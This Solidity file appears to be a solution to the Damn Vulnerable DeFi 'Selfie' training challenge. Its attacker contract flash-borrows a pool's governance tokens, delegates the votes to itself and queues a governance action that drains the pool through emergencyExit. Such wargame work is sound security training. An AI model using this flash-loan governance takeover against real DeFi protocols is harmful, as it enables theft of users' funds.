// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {SelfiePool} from "./SelfiePool.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {DamnValuableVotes} from "../DamnValuableVotes.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {console} from "forge-std/console.sol";

contract SelfieAttacker is IERC3156FlashBorrower {
    DamnValuableVotes public immutable dvt;
    SelfiePool public immutable pool;
    SimpleGovernance public immutable governance;
    address public immutable recovery;
    address public immutable owner;

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    constructor(DamnValuableVotes _token, SelfiePool _pool, SimpleGovernance _governance, address _recovery) {
        pool = _pool;
        dvt = _token;
        governance = _governance;
        recovery = _recovery;
        owner = msg.sender;
    }

    function attack() public returns (uint256) {
        console.log("Pre-Balance: ", dvt.balanceOf(address(this)));

        // 0. Pre-approve the pool to transfer back the flash loan
        dvt.approve(address(pool), type(uint256).max);

        console.log("Approved");

        // 1. Flash loan the pool with a large amount
        require(pool.flashLoan(this, address(pool.token()), TOKENS_IN_POOL, ""));

        return governance.getActionCounter() - 1;
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
        external
        override
        returns (bytes32)
    {
        console.log("Balance: ", dvt.balanceOf(address(this)));

        dvt.delegate(address(this));

        console.log("Votes: ", dvt.getVotes(address(this)));

        bytes memory callData = abi.encodeWithSelector(SelfiePool.emergencyExit.selector, recovery);

        governance.queueAction(address(pool), 0, callData);

        return CALLBACK_SUCCESS;
    }
}
